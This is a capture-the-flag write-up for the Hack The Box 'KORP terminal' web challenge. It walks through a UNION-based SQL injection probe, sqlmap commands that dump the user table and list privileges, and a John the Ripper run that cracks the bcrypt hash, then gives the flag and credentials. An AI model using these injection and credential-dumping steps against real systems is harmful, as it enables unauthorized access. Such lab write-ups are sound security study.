## Title

KORP terminal

## Description

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

## Solution

In this challenge we only receive a login page.
It seems like it is SQL injection. However, when performing SQL injection in the user we get the following error:
`Use multi=True when executing multiple statements`.


What is strange is that it only has one column and asks for two parameters.
We know that because when we try to do a SQLi with UNION and using the NULL's to find the right amount of columns we get one.

`username=' UNION SELECT NULL -- &password=admin`

However we get the following error:

`"'NoneType' object has no attribute 'encode'"`

Meaning NULL is not the data type, changing NULL to a string("") we get the error:

`"Invalid salt"`

It seems like the username should be encrypted with the salt before we send it.
We don't know the salt.

using sqlmap we can dump the user password:

`sqlmap -r web/korp_terminal/request -p username -level 5 -risk 3 --ignore-code 401 --dbs -D korp_terminal --columns --dump`

```
1  | $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv. | admin 
```


Enumerating the privileges of our user we only have USAGE privilege:

`sqlmap -r request -p username -level 5 -risk 3 --ignore-code 401 --dbs --privileges --roles --batch`

```
[*] 'lean'@'localhost' [1]:
    role: USAGE
```


I have used john the ripper with rockyou.txt to crack the hash:

```
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)
1g 0:00:00:18 DONE (2024-03-11 12:02) 0.05488g/s 77.05p/s 77.05c/s 77.05C/s winston..harry
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

After login we get the flag: `HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`
Username: admin, Password: password123